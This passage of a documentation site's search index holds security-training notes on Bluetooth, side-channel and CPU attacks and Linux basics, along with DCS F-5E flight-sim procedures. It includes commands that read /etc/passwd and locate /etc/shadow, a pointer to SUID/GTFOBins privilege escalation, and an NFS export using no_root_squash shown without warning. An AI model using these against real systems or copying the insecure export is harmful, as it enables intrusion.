","version":"Next","tagName":"h2"},{"title":"Introduction to hardware attacks","type":0,"sectionRef":"#","url":"/docs/Hacking/HTB Academy/Introduction to Hardware attacks","content":"","keywords":"","version":"Next"},{"title":"Bluetooth attacks​","type":1,"pageTitle":"Introduction to hardware attacks","url":"/docs/Hacking/HTB Academy/Introduction to Hardware attacks#bluetooth-attacks","content":" Bluetooth, a wireless technology standard, is designed for transferring data over short distances. The technology operates by establishing personal area networks (PANs) using radio frequencies in the ISM band from 2.402 GHz to 2.480 GHz.  Device pairing:  Discovery: a device broadcast its presence to other Bluetooth devices.Pairing Request: a second device finds the broadcasted device and sends a pairing request.Authentication: the devices authenticate each other using a shared secret. This involve entering a PIN on one or both devices.  When they are paired, they can connect automatically in the future.  After pairing, Bluetooth devices form a network known as a piconet. This collection of devices connected via Bluetooth technology consists of one main device and up to seven active client devices. The main device coordinates communication within the piconet.  The main device decides which can of transmissions will happen in the piconet. There are two types of links for data transfer:  Synchronous Connection Oriented (SCO) links: used for audio communication. Guarantee uninterrumpted communication.Asynchronous Connection-Less (ACL) links: All other type of data, no reservation.  Risks of Bluetooth:  Unauthorised Access: Attackers can exploit vulnerabilities to take control of the device or eavesdrop data exchanges.Data theft: attackers might exploit vulnerabilities to extract personal and sensitive data.Interferece: Bluetooth works in the 2.4 Ghz band which is shared by many technologies. An attacker might corrupt the connections by creating intentional interferences.DoS: Attackers can overwhlem the deviceDevice tracking: attackers can track radio signals to track the physical location of the device.  Bluetooth atacks:  Bluejacking: an attacker send unsolicited messages to a device. Kind of spam. Apple devices were susceptible to an attack very similar to Bluejacking via AirDropBluesnarfing: unauthorised access to a Bluetooth device's data.Bluebugging: an attacker control a Bluetooth device. Making calls, sending messages and accessing data.Car whisperer: specifically target vehicles. Remotely unlock car doors or even start the engine.Bluesmaking &amp; DoS: disrupt or disable the connection between devices. Bluesmacking send excessive connection requests leaving the targeted device unusable.Man-in-the-Middle: positioning the attacker between the devices. They can eavesdrop information or alter data.BlueBorne: control of a device without requiring any user interaction or pairing.Key extraction: Retrieve encryption keys. Undermine the confidentiality of communications.Eavesdropping: intercepting and listening to Bluetooth communications. Attackers capture data transmitted.Bluetooth Impersonation attack: the attacker impersonates a trusted Bluetooth device. This results in data theft, unauthorized access.  ","version":"Next","tagName":"h2"},{"title":"Cryptoanalysis​","type":1,"pageTitle":"Introduction to hardware attacks","url":"/docs/Hacking/HTB Academy/Introduction to Hardware attacks#cryptoanalysis","content":" Cryptanalysis is a fascinating and essential facet of cybersecurity that delves into the intricate world of cyphers and codes. It is the art and science of breaking ciphertext, cyphers and cryptosystems - essentially, Cryptanalysis is the process of decrypting coded or encrypted data without access to the key used in the encryption process.  There are some interesting techniques in cryptoanalysis:  Frequency Analysis: statistical study of the letters or symbols in the cypher text.Pattern finding: certain groups of characters or patterns reoccur in the cypher text, they may represent the same plain text.Brute force attacks: try all possible combinations  Cryptoanalysis side-channel attacks are a category of attacks where information is leaked during the execution of cryptographic algorithms. This kind of attacks try to attack the physical implementation of these systems. These attacks leverage indirect information such as timing data, power usage, electromagnetic emissions, and acoustic signals. Can be classified into:  Passive: the attacker monitors the system without actively interfering. E.g: power consumption, timing or electromagnetic emissions.Active: the attacker manipulates the system. E.g: add particular inputs to observe the output or time changes.  There are different kinds of side-channel attacks:  Timing attacks: exploit the fact that different operations and instructions may take different amounts of time to execute on a computer. These algorithms are designed to run for the same amount of time, regardless of the input or any secret informationPower-Monitoring attacks: exploit variations in the device's power consumption.Acoustic: extract sensitive information from a system by analysing the sound emissions, e.g. the acoustic emissions of typing on a keyboard can vary with different keys, which can be exploited through keyboard eavesdropping  ","version":"Next","tagName":"h2"},{"title":"Microprocessors​","type":1,"pageTitle":"Introduction to hardware attacks","url":"/docs/Hacking/HTB Academy/Introduction to Hardware attacks#microprocessors","content":" A microprocessor is an integrated circuit (IC) that encapsulates the functions of a central processing unit (CPU) on a single silicon chip.  It is formed by multiple components:  Control Unit (CU): Directs the operation of the processor, interconnects the input,output,ALU,etc..Arithmetic logic unit (ALU): Performs arithmetic and logic operations.Instruction Set architecture: defines the data types, the registers, and the set of machine-language commands.  Everything in a processor works thanks to the transistors that store the 0 and 1 physically. The control unit uses combinations of these binary values to represent different commands and data. The arithmetic logic unit uses transistors based on these binary instructions to perform arithmetic and logical operations.  There are two main architectures:  CISC (Complex Instruction Set Computer): many tools in one package.RISC (Reduced Instruction Set Computer): do one thing very well.  Microprocessors can contain weaknesses or flaws in the design or implementation of microprocessors that can be exploited to compromise the security of a computing system.  Vulnerabilities exploit some optimizations like:  Speculative execution: Spectre vulnerability forces the processor to discard speculative results but they are kept in the cache for some time. The attacker can construct special machine instructions to force the speculative execution to leak the data into the cache while the execution flow goes normally. Then, a side-attack channel is used to read the cache contents.Out of order execution. The processor executes the instructions not in the sequential order defined by the program but in an order dictated by the availability of resources. The meltdown vulnerability induces an exception (attempt to access an off-limit memory location), the out-or-order execution allows further instructions that depend on this access to be executed before the exception is handled. And again, the attacker can store the results into the cache and read it with a side-channel attack. ","version":"Next","tagName":"h2"},{"title":"Linux fundamentals","type":0,"sectionRef":"#","url":"/docs/Hacking/HTB Academy/Linux fundamentals","content":"","keywords":"","version":"Next"},{"title":"System information​","type":1,"pageTitle":"Linux fundamentals","url":"/docs/Hacking/HTB Academy/Linux fundamentals#system-information","content":" whoami: current usernameid: user identity and groupshostname: name of the current host systemuname: basic information about OS and system hardwarepwd: current directory nameifconfig: network interfacesip: network interfaces plus routing, etcnetstat: network statusss: socketsps: processes statuswho: who is logged inenv: environment variableslsblk: list block deviceslsusb: list USB deviceslsof: list open fileslspci: list PCI devices  ","version":"Next","tagName":"h2"},{"title":"Find files and directories​","type":1,"pageTitle":"Linux fundamentals","url":"/docs/Hacking/HTB Academy/Linux fundamentals#find-files-and-directories","content":" which: returns the path to the file or link that should be executedfind: find files and folders and filter the results.  e.g:  find / -type f -name *.conf -user root -size +20k -newermt 2020-03-03 -exec ls -al {} \\; 2&gt;/dev/null   -type f: searching for files-name *.conf: All files with the conf extension.-user root: Belongs to root user-size +20k: Larger than 20KiB-newermt 2020-03-03: Files created after the passed date.-exec ls -al {} \\;: Execute a command for each entry, the {} char is a wildcard for the filename.2&gt;/dev/null: Sends the error to /dev/null  locate: use a local database to improve the searching time. You can update the database with sudo updatedb. e.g:  locate *.conf   locate does not have filtering options as find  ","version":"Next","tagName":"h2"},{"title":"Redirections​","type":1,"pageTitle":"Linux fundamentals","url":"/docs/Hacking/HTB Academy/Linux fundamentals#redirections","content":" Redirect STDOUT to a file:  find /etc/ -name shadow &gt; results.txt  Redirect STDERR to null:  find /etc/ -name shadow 2&gt;/dev/null  Redirect STDOUT and STDERR to different files:  find /etc/ -name shadow 2&gt; stderr.txt 1&gt; stdout.txt  Redirect STDIN:  cat &lt; stdout.txt  Pass the contents of stdout.txt to STDIN  Redirect STDOUT and Append to a File  find /etc/ -name passwd &gt;&gt; stdout.txt  The &gt;&gt; will append the contents to a file while &gt; will truncate the file and start from scratch.  Pipes |: redirect STDOUT from one program to the next  find /etc/ -name *.conf 2&gt;/dev/null | grep systemdfind /etc/ -name *.conf 2&gt;/dev/null | grep systemd | wc -l  ","version":"Next","tagName":"h2"},{"title":"Filter contents​","type":1,"pageTitle":"Linux fundamentals","url":"/docs/Hacking/HTB Academy/Linux fundamentals#filter-contents","content":" more: cat /etc/passwd | more. Exit the pager with Qless: less /etc/passwd. Exit the pager with Q.head: head /etc/passwd. Display the ten first lines of a file.tail: tail /etc/passwd. Counterpart of head. Display the ten last lines of a filesort: cat /etc/passwd | sort: Sort alphabetically the outputgrep: cat /etc/passwd | grep &quot;/bin/bash&quot;. Pattern matching ot the outputcut: Separate the output with delimiters. cat /etc/passwd | grep -v &quot;false\\|nologin&quot; | cut -d&quot;:&quot; -f1. -d sets the character as delimiter, -f the position to displaytr: Replace characters. cat /etc/passwd | grep -v &quot;false\\|nologin&quot; | tr &quot;:&quot; &quot; &quot;. Replace : by space.column -t: Tabulate the output: cat /etc/passwd | grep -v &quot;false\\|nologin&quot; | tr &quot;:&quot; &quot; &quot; | column -tawk: text processor.  cat /etc/passwd | grep -v &quot;false\\|nologin&quot; | tr &quot;:&quot; &quot; &quot; | awk '{print $1, $NF}'   display the first ($1) and last ($NF) result of the line.  sed: stream editor. Allow to replace characters in more complex fashion. eg:  cat /etc/passwd | grep -v &quot;false\\|nologin&quot; | tr &quot;:&quot; &quot; &quot; | awk '{print $1, $NF}' | sed 's/bin/HTB/g'   Replaces the word bin with the word HTB  wc: word count. Useful to count the lines, e.g:  cat /etc/passwd | grep -v &quot;false\\|nologin&quot; | tr &quot;:&quot; &quot; &quot; | awk '{print $1, $NF}' | wc -l   ","version":"Next","tagName":"h2"},{"title":"Regular expressions (RegEx)​","type":1,"pageTitle":"Linux fundamentals","url":"/docs/Hacking/HTB Academy/Linux fundamentals#regular-expressions-regex","content":" Regular expressions (RegEx) are like the art of crafting precise blueprints for searching patterns in text or files.  Operators:  Group: (a). The round brackets are used to group parts of a regex. Within the brackets, you can define further patterns which should be processed together.Square brackets: [a-z]. The square brackets are used to define character classes. Inside the brackets, you can specify a list of characters to search for.Curly brackets: {1,10}. The curly brackets are used to define quantifiers. Inside the brackets, you can specify a number or a range that indicates how often a previous pattern should be repeated.OR operator: | shows results when one of the two expressions matches .*: Operates similarly to an AND operator by displaying results only when both expressions are present and match in the specified order  Examples:  grep -E &quot;(my|false)&quot; /etc/passwd   Searches for lines containing my or false  grep -E &quot;(my.*false)&quot; /etc/passwd   Searches for lines containing my and false. Equivalent to grep -E &quot;my&quot; /etc/passwd | grep -E &quot;false&quot;  ","version":"Next","tagName":"h2"},{"title":"Permissions​","type":1,"pageTitle":"Linux fundamentals","url":"/docs/Hacking/HTB Academy/Linux fundamentals#permissions","content":" cry0l1t3@htb[/htb]$ ls -l /etc/passwd - rwx rw- r-- 1 root root 1641 May 4 23:42 /etc/passwd - --- --- --- | | | | |__________| | | | | | | | | |_ Date | | | | | | | |__________ File Size | | | | | | |_______________ Group | | | | | |____________________ User | | | | |_______________________ Number of hard links | | | |_ Permission of others (read) | | |_____ Permissions of the group (read, write) | |_________ Permissions of the owner (read, write, execute) |____________ File type (- = File, d = Directory, l = Link, ... )   We can modify permissions using the chmod command, permission group references (u - owner, g - Group, o - others, a - All users), and either a [+] or a [-] to add remove the designated permissions:  cry0l1t3@htb[/htb]$ ls -l shell -rwxr-x--x 1 cry0l1t3 htbteam 0 May 4 22:12 shell cry0l1t3@htb[/htb]$ chmod a+r shell &amp;&amp; ls -l shell -rwxr-xr-x 1 cry0l1t3 htbteam 0 May 4 22:12 shell cry0l1t3@htb[/htb]$ chmod 754 shell &amp;&amp; ls -l shell -rwxr-xr-- 1 cry0l1t3 htbteam 0 May 4 22:12 shell   We can use the octal representation of the permissions:  Binary Notation: 4 2 1 | 4 2 1 | 4 2 1 ---------------------------------------------------------- Binary Representation: 1 1 1 | 1 0 1 | 1 0 0 ---------------------------------------------------------- Octal Value: 7 | 5 | 4 ---------------------------------------------------------- Permission Representation: r w x | r - x | r - -   To change the owner of a file or directory, we'll use chown:  chown &lt;user&gt;:&lt;group&gt; &lt;file/directory&gt;   In addition to standard user and group permissions, Linux allows us to configure special permissions on files through the Set User ID (SUID) and Set Group ID (SGID) bits. These bits function like temporary access passes, enabling users to run certain programs with the privileges of another user or group. For example, administrators can use SUID or SGID to grant users elevated rights for specific applications, allowing tasks to be performed with the necessary permissions, even if the user themselves doesn’t normally have them.  The presence of these permissions is indicated by an s in place of the usual x in the file's permission set.  This important to notice, because it's a very good vector for privilege escalation. If a user has suid access to a binary, we can use GTFO bins to see how can we escape from that binary and have root access.  In shared directories, we can leverage Sticky bits to make sure the owner is the only one that can delete or rename files. Other users can access the directory but can't modify files they don't own.  Example:  cry0l1t3@htb[/htb]$ ls -l drw-rw-r-t 3 cry0l1t3 cry0l1t3 4096 Jan 12 12:30 scripts drw-rw-r-T 3 cry0l1t3 cry0l1t3 4096 Jan 12 12:32 reports   In this example, we see that both directories have the sticky bit set. However, the reports folder has an uppercase T, and the scripts folder has a lowercase t.  If the sticky bit is capitalized (T), then this means that all other users do not have execute (x) permissions and, therefore, cannot see the contents of the folder nor run any programs from it. The lowercase sticky bit (t) is the sticky bit where the execute (x) permissions have been set.  ","version":"Next","tagName":"h2"},{"title":"User management​","type":1,"pageTitle":"Linux fundamentals","url":"/docs/Hacking/HTB Academy/Linux fundamentals#user-management","content":" sudo: Execute command as a different user.su: Switches to user ID (the default user is the superuser).useradd: Creates a new user or update default new user information.userdel: Deletes user account and related filesusermod: Modifies user accountaddgroup: Add a group to the systemdelgroup: Delete a grouppasswd: Changes user password  ","version":"Next","tagName":"h2"},{"title":"Service and process management​","type":1,"pageTitle":"Linux fundamentals","url":"/docs/Hacking/HTB Academy/Linux fundamentals#service-and-process-management","content":" System services: internal services required during system startup.User-Installed Services: These services are added by users and typically include server applications and other background processes that provide specific features or capabilities.  Most modern Linux distributions have adopted systemd as their initialization system (init system). It is the first process that starts during the boot process and is assigned the Process ID (PID). All processes in a Linux system are assigned a PID and can be viewed under the /proc/ directory, which contains information about each process. Processes may also have a Parent Process ID (PPID), indicating that they were started by another process (the parent), making them child processes.  systemctl start ssh # start service with systemctl systemctl status ssh # check the status systemctl enable ssh # Run this service after startup   Check the process is running:  ps -aux | grep ssh systemctl list-units --type=service # List systemctl enabled services   To debug services, use journalctl:  journalctl -u ssh.service --no-pager   To kill a process, we can use kill, pkill, pgrep and killall. To interact with a process, we will send them signals:  1- SIGHUP - This is sent to a process when the terminal that controls it is closed. 2- SIGINT - Sent when a user presses Ctrl + C in the controlling terminal to interrupt a process. 3- SIGQUIT - Sent when a user presses Ctrl + D to quit. 9- SIGKILL - Immediately kill a process with no clean-up operations. 15- SIGTERM - Program termination. 19- SIGSTOP - Stop the program. It cannot be handled anymore. 20-\tSIGTSTP - Sent when a user presses Ctrl + Z to request for a service to suspend. The user can handle it afterward.   To send the SIGKILL:  kill 9 &lt;PID&gt;   We can send a process to background using Ctrl + Z. Background process can be observed with jobs command:  The Ctrl + Z shortcut suspends the processes, and they will not be executed further. To keep it running in the background, we have to enter the command bg to put the process in the background.  Another option is to automatically set the process with an AND sign (&amp;) at the end of the command.  ping -c 10 www.hackthebox.eu &amp;   If we want to get the background process into the foreground and interact with it again, we can use the fg &lt;ID&gt; command.  When we need to execute multiple comments, we have multiples options:  semicolon separator: ;  echo '1'; echo '2'; echo '3'   The semicolon (;) is a command separator and executes the commands by ignoring previous commands' results and errors.  Double ampersand &amp;&amp;:  echo '1' &amp;&amp; ls MISSING_FILE &amp;&amp; echo '3'   If there is an error in one of the commands, the following ones will not be executed anymore, and the whole process will be stopped.  Pipes |.  Pipes (|) depend not only on the correct and error-free operation of the previous processes but also on the previous processes' results.  This will become important on command injection attacks, where the attacker needs to execute multiple commands.  ","version":"Next","tagName":"h2"},{"title":"Task scheduling​","type":1,"pageTitle":"Linux fundamentals","url":"/docs/Hacking/HTB Academy/Linux fundamentals#task-scheduling","content":" Automate tasks by running them at specific times or regular intervals, eliminating the need for manual initiation.  ","version":"Next","tagName":"h2"},{"title":"Systemd​","type":1,"pageTitle":"Linux fundamentals","url":"/docs/Hacking/HTB Academy/Linux fundamentals#systemd","content":" Based on timers.  sudo vim /etc/systemd/system/mytimer.timer # Create the timer [Unit] Description=My Timer [Timer] OnBootSec=3min OnUnitActiveSec=1hour [Install] WantedBy=timers.target sudo vim /etc/systemd/system/mytimer.service # Create the service [Unit] Description=My Service [Service] ExecStart=/full/path/to/my/script.sh [Install] WantedBy=multi-user.target sudo systemctl daemon-reload # Instruct systemctl to reload the definition sudo systemctl start mytimer.timer # start the service sudo systemctl enable mytimer.timer # enable the service to be executed at startup   ","version":"Next","tagName":"h3"},{"title":"Cron​","type":1,"pageTitle":"Linux fundamentals","url":"/docs/Hacking/HTB Academy/Linux fundamentals#cron","content":" Execute crontab to edit cron:  # System Update 0 */6 * * * /path/to/update_software.sh # Execute Scripts 0 0 1 * * /path/to/scripts/run_scripts.sh # Cleanup DB 0 0 * * 0 /path/to/scripts/clean_database.sh # Backups 0 0 * * 7 /path/to/scripts/backup.sh   You can explore crontab format in https://crontab.guru/  ","version":"Next","tagName":"h3"},{"title":"Network services​","type":1,"pageTitle":"Linux fundamentals","url":"/docs/Hacking/HTB Academy/Linux fundamentals#network-services","content":" SSH: securely manage remote systems and securely access remote systems to execute commands or transfer files.  -NFS: Network File System (NFS) is a network protocol that allows us to store and manage files on remote systems as if they were stored on the local system.  Use the file /etc/exports to define the shares:  mkdir nfs_sharing echo '/home/cry0l1t3/nfs_sharing hostname(rw,sync,no_root_squash)' &gt;&gt; /etc/exports at /etc/exports | grep -v &quot;#&quot;   Now in another computer, we can mount the share:  mkdir ~/target_nfs mount 10.129.12.17:/home/john/dev_scripts ~/target_nfs   Web server: Apache, Nginx, Python  python3 -m http.server --directory /home/cry0l1t3/target_files 1234   Will expose a webserver in port 1234 showing the contents of /home/cry0l1t3/target_files. ","version":"Next","tagName":"h2"},{"title":"F5E","type":0,"sectionRef":"#","url":"/docs/flight-sim/dcs/f5e","content":"","keywords":"","version":"Next"},{"title":"Procedures​","type":1,"pageTitle":"F5E","url":"/docs/flight-sim/dcs/f5e#procedures","content":" ","version":"Next","tagName":"h2"},{"title":"Engine start-up​","type":1,"pageTitle":"F5E","url":"/docs/flight-sim/dcs/f5e#engine-start-up","content":" From the aircraft completely stopped to engines started  Operation\tControlBattery switch on\tMouse click Left and right generator switches ON\tMouse click Left and right fuel pump ON\tMouse click Set UHF Frequency to BOTH\tMouse click Request ATC Engine startup\tç -&gt; F5 -&gt; F1 Request Ground crew compressed air supply (connect)\tç -&gt; F8 -&gt; F5 -&gt; F1 Request Ground crew compressed air supply (supply)\tç -&gt; F8 -&gt; F5 -&gt; F3 Once left engine engine reaches 10%, start engine\tRight Alt + Home Let engine stabilise (30s) to the following params\tVisual  tip Normal engine operation values IDLE RPM: 50% Exhaust Gas Temperature: &gt; 140 ºC Nozzle position: 60-79 % Fuel flow: 400 pph Oil pressure: 5-20 psi Hydraulic and flight control pressure: 2800-3200 psi  Operation\tControlCheck AUX intake left is OPEN (barber pole)\tVisual Repeat procedure for right engine Request Ground crew compressed air supply (supply)\tç -&gt; F8 -&gt; F5 -&gt; F3 Once right engine engine reaches 10%, start engine\tRight Shift + Home Stabilise and wait (30s) for normal engine operation values\tVisual Check both AUX intake are OPEN\tVisual  ","version":"Next","tagName":"h3"},{"title":"Post start-up​","type":1,"pageTitle":"F5E","url":"/docs/flight-sim/dcs/f5e#post-start-up","content":" The aircraft will be ready to taxi after this step  Operation\tControlDisconnect compressed air supply\tç -&gt; F8 -&gt; F5 -&gt; F2 Set yaw and pitch dumper\tMouse click Set oxygen supply ON\tMouse click Confirm air flow\tVisual Retract air brakes (FWD position)\tB Set flap mode switch to THUMB SW\tMouse click Set flaps position to FULL\tF Trim elevator pitch\tJoystick  tip Trim values Empty: 6Tanks + gun + missiles: 7Tanks + gun + missile + bombs + rockets: 8  Operation\tControlReset the altimeter and set barometric pressure to QNH in briefing\tMouse Primary and secondary attitude indicator trim -3 degress\tMouse Power/search button in RWR\tMouse click Fuel autobalance switch to the side with less fuel\tMouse click Pitot switch ON\tMouse click Engine de-icing ON\tMouse click Disable master caution\tMouse click Set Exterior NAV lights (BRT)\tMouse click Set Formation lights (BRT)\tMouse click Set Beacon lights (BRT)\tMouse click Set radar OFF\tMouse click Set chaff/flare selector to SINGLE\tMouse click Set IFF transpoder code\tMouse click Remove wheel chocks\tç -&gt; F8 -&gt; F4 -&gt; F2 Close canopy\tLeft Control + C  The aircraft is ready to taxi  ","version":"Next","tagName":"h3"},{"title":"Taxi to runway​","type":1,"pageTitle":"F5E","url":"/docs/flight-sim/dcs/f5e#taxi-to-runway","content":" Moving the aircraft from parking to the runway  Operation\tControlRequest ATC Taxi\tç -&gt; F5 Set Taxi/Landing lights (BRT)\tMouse click Throttle to 65-70 %\tHOTAS Axis Nose wheel steering button to turn the aircraft\tJoystick Turn the aircraft using pedals\tHOTAS Pedals Throttle to 55-60 % during taxi\tHOTAS Axis  ","version":"Next","tagName":"h3"},{"title":"Takeoff​","type":1,"pageTitle":"F5E","url":"/docs/flight-sim/dcs/f5e#takeoff","content":" The aircraft is waiting to enter the runway.  Operation\tControlRequest ATC clearance to enter the runway\tç -&gt; F5 Check both sides when entering the runway\tVisual Taxi/Landing lights OFF\tMouse click Check takeoff speed from table\tVisual Check elevator trim\tVisual Align with runway\tHOTAS Pedals Check magnetic compass with expected heading\tVisual Set Radar to STBY\tMouse click Set Nose struct\tMouse click Check flaps AUTO and brake retracted (FWD)\tVisual Hold break and thrust to 95% and let stabilise\tHOTAS button + HOTAS axis Release break and full throttle\tHOTAS axis Rotate at expected speed\tJoystick Check Angle-Of-Attack to see speed and altitude increase\tVisual When climb rate is positive, retract landing gear\tHOTAS button or G MIL power (90% throttle)\tHOTAS axis Check climb speed no less than 300kt\tVisual Fuel autobalance switch to the side with less fuel\tMouse click  ","version":"Next","tagName":"h3"},{"title":"Approach and landing​","type":1,"pageTitle":"F5E","url":"/docs/flight-sim/dcs/f5e#approach-and-landing","content":" Fly downwind leg over the airport. The approach starts at 3NM and must be performed at the beginning at 300kt and 1500ft altitude.  Operation\tControlCalculate landing speed index and set it\tMouse Check barometric pressure of the landing airport\tVisual Start at 3NM, 300kt and 1500ft altitude\tVisual Set flaps to AUTO\tF Fly the downwind leg and slowdown to 260kt When speed is lower than 260kt, deploy landing gear\tG Check landing gear three lights are green\tVisual Slowdown to 160kt, keep 1500ft altitude\tB Turn to take landing course Lose altitude at -1000ft/min vertical speed and 145kt Reduce vertical speed to -400ft/min on the final Check Angle-Of-Attack lights to be ok (green)\t  tip AoA landing indicator ⬇️: too slow, speed up0️⃣: On correct speed⬆️: too fast, slow down  Operation\tControlCalculate landing speed index and set it\tMouse At 20ft flare and land at landing speed (e.g. 135kt) Apply wheel breaks\tHOTAS button Deploy parachute\tP  ","version":"Next","tagName":"h3"},{"title":"TACAN: instrument navigation and landing​","type":1,"pageTitle":"F5E","url":"/docs/flight-sim/dcs/f5e#tacan-instrument-navigation-and-landing","content":" TACAN is the military equivalent of civil VOR nagivation. And the landing procedure is a little bit different  Approach distance calculation​  The approach will be performed at 2400ft and 300kt.  For landing, we first must compute the distance of the TACAN where the descend must start, to do so:  Current altitude - 2400ft will give the required descent altitude. E.g:  6000ft - 2400ft = 3600ft   Assuming a descent speed of 300kt and vertical speed of 2000ft/min, we can compute the distance to start the descend by:  Distance = Current altitude - airport altitude / 100 / 4, e.g:  Distance = 6000 - 2400 = 3600 / 100 = 36 / 4 = 9 NM   Then, we add 5 NM to align with the correct course and we have to start descending to approach altitude at 9 + 5 = 14 NM.  Entering downwind leg​  We land facing the wind with the cockit, the wind will make breaking the aircraft easier. In order to do so, we must fly the downwind leg and turn 180º to land.  When we reach the TACAN station at the airport, we must add 23º to the course to enter the landing course. e.g:  Landing at runway 27: 268º The reverse course is: 268 - 180 = 88º We add 23º to that: 88º + 23º = 111º   When reaching the TACAN, keep the same course for 2 NM for clear reads of TACAN signals, then configure the course to the previously computed (111º)  Fly for 13NM in 111º and turn left to landing course of 268º.  Remember to keep 2400ft and 300kt all the time.  Descending the approach​  While on landing course, slowdown to 260kt and take out the landing the gear.  tip Calculating landing speedDepends on the weight of the aircraft (fuel + ammunition): Fuel weights 1000 pounds and no ammo: 145ktMore than 1000 pounds of fuel: increase 1kt per each 200 poundsGun ammo full: add another 5kt  Keep landing speed plus 20kt during the descend phase.  When distance to TACAN is 8NM, start descending with vertical speed of 600-700 ft/min.  At 1200ft of altitude, TACAN should read 4NM of distance. You must manouver to find the optimal glide path.  ","version":"Next","tagName":"h3"},{"title":"Taxi from runway and park​","type":1,"pageTitle":"F5E","url":"/docs/flight-sim/dcs/f5e#taxi-from-runway-and-park","content":" The aircraft has landed and exited the runway. Now is taxing to the parking.  Operation\tControlDrop parachute at the exit of the runway\tMouse click Cabin pressure dump\tMouse click Apply air breaks, flaps UP\tB and F Disable Radar\tMouse click Disable gunsight\tMouse click Disable pitot heating\tMouse click Open canopy\tMouse click Disable remaining switches\tMouse click Throttle set to OFF in both engines\tRight ALT + End and Right Shit + End Pull to cage instruments\tMouse click Turn OFF fuel pumps\tMouse click Turn OFF generator\tMouse click Turn OFF battery\tMouse click  ","version":"Next","tagName":"h3"},{"title":"Weapons​","type":1,"pageTitle":"F5E","url":"/docs/flight-sim/dcs/f5e#weapons","content":" ","version":"Next","tagName":"h2"},{"title":"Air to air​","type":1,"pageTitle":"F5E","url":"/docs/flight-sim/dcs/f5e#air-to-air","content":" MSL mode​  MSL stands for Missile mode.  MSL mode is used to fire air-to-air missile. F5E can use AIM-9 which are heat seaking missiles.  Operation\tControlSelect MSL mode in gunsight\tMouse click Radar OPER\tMouse click Arm AIM-9 pylons\tMouse click Arm master arms switch\tMouse click  Now the AIM-9 will start a growl noise that will be interrupted when they find a source of heat. Now we should use the Radar to find targets.  Operation\tControlStart searching for targets with the radar at 40NM range\tRadar range button Tilt the antena from +10 to -10 degress\tRadar antena tilt button If something appears change to 20NM range. The ACQ cursor appear\tRadar range button Put the ACQ cursor on top of the target symbol in the redar\tTDC Disengage afterburner\tThrust lever Attempt to lock. It will not lock until close to 10NM\tTDC button If the target is locked, you'll see LK ON light. If not, you must resume the search\tRadar resume search button When the target is locked, increase throttle to afterburner\tThrust lever If it's locked, wait for IN RANGE light\tVisual Point the gunsight to source of heat, when the AIM-9 changes the sounds, fire it\tArms-Bombs release button  DM mode​  DM stands for Dogfight Missile mode. It's useful when the target is really close and we want to shoot a missile. The radar scanning is as always, start at 40NM, tilt the antena until the target is at 10NM range.  Operation\tControlSet radar search to 10NM\tRadar range button Enable master arms\tMouse click Enable AIM-9 pylons\tMouse click Set gunsight to MSL\tMouse click When the target is at 5NM keep the target is the center line of radar\tVisual Climb at the same rate as the antena tilt, e.g. 10º\tVisual Enable DM mode\tHOTAS button The target is locked automatically\tVisual Manouver to keep the target in the Radar reticule until is visually found\tVisual Keep the target in the gunsight until IN RANGE signal appears\tVisual Fire the missile. If the target is manouvering, you should use missile uncage button\tHOTAS button  DG and AA/1 mode​  DG stands for Dogfight guns mode. It's useful when we want to fire guns to a manouvering target at different speeds, typically a fighter.  Operation\tControlSet radar search to 10NM\tRadar range button Enable master arms\tMouse click Set gunsight to AA/1\tMouse click Search as usually with the Radar\tVisual When target is at range (0.9NM) or the last line of Radar, select DG mode\tHOTAS button The target will be locked up automatically\tVisual Keep the target in the center of the gunsight and wait for IN RANGE\tVisual When IN RANGE, point the gunsight center at the body of the target and fire\tJoystick trigger  AA/2 mode​  AA/2 mode is useful for manouvering targets at constant speed, i.e. bombers  Operation\tControlSet radar search to 10NM\tRadar range button Enable master arms\tMouse click Set gunsight to AA/2\tMouse click Search as usually with the Radar\tVisual When target is at range (0.9NM) or the last line of Radar, select Radar ACQ\tRadar ACQ button The target will be locked, if not, resume search\tResume search button Keep the target in the center of the gunsight and wait for IN RANGE\tVisual When IN RANGE, point the gunsight center at the body of the target and fire\tJoystick trigger  ","version":"Next","tagName":"h3"},{"title":"Air to ground​","type":1,"pageTitle":"F5E","url":"/docs/flight-sim/dcs/f5e#air-to-ground","content":" Bombs​  The F5E is only capable of deliver dumb bombs. In order to do so, you must do a dive bombing and use the altitude, speed parameters and the gunsight to calculate when to drop the bombs.  The dive has to be done under the following parameters:  Operation\tValueSet gunsight to MAN\tMAN Set reticule depresion\t80 MILS Enable master arms\tMouse click Weapon type select Bombs\tMouse click Select bombs pylon\tMouse click Select any bomb fuse option but SAFE\tMouse click Dive altitude start\t5000ft + target altitude Dive speed start\t350kt Dive angle\t20º Drop bomb altitude\t3200ft Drop bomb speed\t400kt  The flight manual contains all sorts of parameters for different dive angles.  Rockets and guns​  Using rockets and guns to attack ground targets is similar to using bombs. They rely on a dive to release them. The parameters are similar to dive bombing:  Operation\tValueSet gunsight to MAN\tMAN Set reticule depresion\t14 MILS Enable master arms\tMouse click External stores select Rockets\tMouse click Select rockets pylon\tMouse click Dive altitude start\t5000ft + target altitude Dive speed start\t350kt Dive angle\t20º Drop bomb altitude\t3200ft Drop bomb speed\t400kt  For using guns, the only difference is that 12 MILS should be configured as reticule depression.  Laser guided bombs​  The F5E is capable of deliver GBU-12 laser guided bombs where an operator (JTAC) is iluminating the target with laser light. Typically this is done by some ground unit.  Operation\tValueSpeak with JTAC via UHF radio\tRight ALT + ç Select JTAC and check-in time\tF4 JTAC will give 9 lines attack vector to communicate where is the target Use map to locate the target using the 9 lines coordinates\tF10 Enable master arms\tMouse click Select GBU switches\tMouse click Select bombs in External stores\tMouse click Select any bomb fuse but SAFE\tMouse click Once the Ingress Point (IP) is known, navigate to it and inform JTAC\tRight ALT + ç After reaching the IP, the aircraft should be at 3000ft, 400kt Ask JTAC to deploy smoke on the target\tRight ALT + ç Confirm the smoke can be seen to JTAC\tRight ALT + ç Ask JTAC to illuminate the target with laser\tRight ALT + ç Keep the target between the left cannon and the gunsight camera\tVisual Drop the bomb when close to the target\tWeapon release button ","version":"Next","tagName":"h3"},{"title":"Stack based buffer overflow on Linux","type":0,"sectionRef":"#","url":"/docs/Hacking/HTB Academy/Stack-based buffer overflow on Linux","content":"","keywords":"","version":"Next"},{"title":"Memory structure​","type":1,"pageTitle":"Stack based buffer overflow on Linux","url":"/docs/Hacking/HTB Academy/Stack-based buffer overflow on Linux#memory-structure","content":" This this type of attack rely on a mismanagement of application memory, first we need to understand how the memory is structured.  .text: actual assembler instructions of the program. Usually this section is read-only. Any write attempt will likely result in Segmentation Fault..data: contains global and static data defined by the program..bss: Several compilers and linkers use the this section as part of the data 